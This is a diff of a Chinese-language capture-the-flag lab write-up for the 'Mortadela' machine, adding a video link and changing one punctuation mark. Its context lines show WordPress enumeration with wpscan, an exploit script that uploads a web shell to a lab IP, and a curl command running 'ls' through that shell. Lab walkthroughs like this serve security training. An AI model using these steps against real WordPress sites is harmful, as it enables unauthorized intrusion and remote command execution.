@@ -2,6 +2,8 @@
 
 2025.03.07 https://thehackerslabs.com/mortadela/
 
+[video](https://www.bilibili.com/video/BV1WY92YLEfF/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)
+
 ## Ip
 
 192.168.5.39
@@ -27,7 +29,7 @@ wpscan -e u,ap,at,tt,cb --plugins-detection mixed --url http://192.168.5.39/word
 python3 49967.py -u http://192.168.5.39/wordpress -p /index.php/2024/04/01/hola-mundo/
 ```
 
-上传了 web shell : http://192.168.5.39/wordpress/wp-content/uploads/2025/03/kyeeokpkslauami-1741335246.7189.php , pass 为 cmd 。 进行连接验证：
+上传了 web shell : http://192.168.5.39/wordpress/wp-content/uploads/2025/03/kyeeokpkslauami-1741335246.7189.php , pass 为 cmd 进行连接验证：
 
 ```
 curl http://192.168.5.39/wordpress/wp-content/uploads/2025/03/kyeeokpkslauami-1741335246.7189.php?cmd=ls
